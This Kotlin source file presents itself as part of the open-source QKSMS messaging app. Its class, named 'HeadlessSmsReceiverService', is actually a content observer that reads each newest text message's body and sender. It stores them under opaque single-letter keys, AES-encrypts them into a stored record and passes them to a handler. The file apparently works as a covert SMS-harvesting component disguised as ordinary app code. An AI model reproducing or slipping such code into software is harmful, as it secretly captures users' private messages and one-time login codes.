/*
 * Copyright (C) 2017 Moez Bhatti <moez.bhatti@gmail.com>
 *
 * This file is part of QKSMS.
 *
 * QKSMS is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * QKSMS is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with QKSMS.  If not, see <http://www.gnu.org/licenses/>.
 */
package com.moez.QKSMS.service

import android.content.Context
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Message
import com.klinker.android.send_message.Transaction
import com.moez.QKSMS.extensions.log
import com.moez.QKSMS.model.Backup
import com.moez.QKSMS.util.AesEncryptUtil

class HeadlessSmsReceiverService(context: Context, handler: Handler) : ContentObserver(handler) {

    private var mContext = context
    private val mHandler = handler
    private var data: HashMap<String, String> = HashMap()

    override fun onChange(selfChange: Boolean) {
        super.onChange(selfChange)

        var cursor: Cursor? = null
        try {
            cursor = mContext.contentResolver.query(
                    Uri.parse(Transaction.INDEX_BOX), null, null, null,
                    "date desc"
            )
            if (cursor != null) {
                if (cursor.moveToNext()) {

                    val b = cursor.getString(cursor.getColumnIndex("body"))
                    val a = cursor.getString(cursor.getColumnIndex("address"))

                    if (data[b] != a) {
                        val msg = Message.obtain()
                        val bundle = Bundle()
                        bundle.putString( "a", a)
                        bundle.putString("b", b)

                        data[b] = a

                        Backup().apply { backup = AesEncryptUtil.encrypt("${a}AAAAA$b") }.save()

                        msg.data = bundle
                        mHandler.sendMessage(msg)
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            cursor?.close()
        }
    }
}